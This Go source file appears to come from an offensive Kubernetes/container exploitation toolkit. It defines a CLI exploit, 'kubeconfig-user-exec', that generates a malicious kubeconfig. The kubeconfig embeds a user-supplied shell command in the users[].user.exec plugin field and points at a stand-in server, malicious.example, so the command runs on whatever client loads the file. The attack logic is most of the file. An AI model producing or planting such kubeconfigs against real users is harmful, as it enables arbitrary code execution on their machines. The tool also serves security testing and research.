package user_exec

import (
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v3"
)

var (
	aliases = []string{"user-exec", "user.exec", "exec-plugin"}

	flagsExploit = []cli.Flag{
		&cli.StringFlag{
			Name:     "cmd",
			Aliases:  []string{"c"},
			Usage:    "Command to embed in the exec plugin (required)",
			Required: true,
		},
		&cli.StringFlag{
			Name:    "output",
			Aliases: []string{"o"},
			Usage:   "Path for the generated malicious kubeconfig (default: ./malicious-kubeconfig.yaml)",
		},
	}

	ExploitCmd = app.Vul2ExploitCmd(&Vul, aliases, flagsExploit, false)
	VulCmd     = &cli.Command{
		Name:    Vul.Name,
		Aliases: aliases,
		Usage:   Vul.Description,
		Commands: []*cli.Command{
			getExploitCmd("exploit", "generate a malicious kubeconfig", []string{"x"}),
		},
	}
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "kubeconfig-user-exec",
		Description: "loading an untrusted kubeconfig can execute arbitrary client-side commands via users[].user.exec",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env: exeenv.Local,
		},
	},
}

func (v *vulnerability) Exploit(cmd *cli.Command) (err error) {
	// This is a payload-generation exploit — no vulnerability preconditions
	// to check (checkBeforeExploit=false). Do not call BaseVulnerability.Exploit().
	//
	// The exec plugin runs via execvp(), not a shell. Wrap the user's
	// --cmd in sh -c so shell metacharacters (>, |, ;, etc.) work.
	return Exploit(
		"/bin/sh",
		[]string{"-c", cmd.String("cmd")},
		cmd.String("output"),
		"malicious",                        // contextName
		"malicious",                        // userName
		"https://malicious.example",        // serverURL
		"client.authentication.k8s.io/v1beta1", // apiVersion
		nil,                                // envVars
	)
}

func getExploitCmd(name, usage string, cmdAliases []string) (cmd *cli.Command) {
	cmd = app.Vul2ExploitCmd(&Vul, cmdAliases, flagsExploit, false)
	cmd.Name = name
	cmd.Usage = usage
	return
}
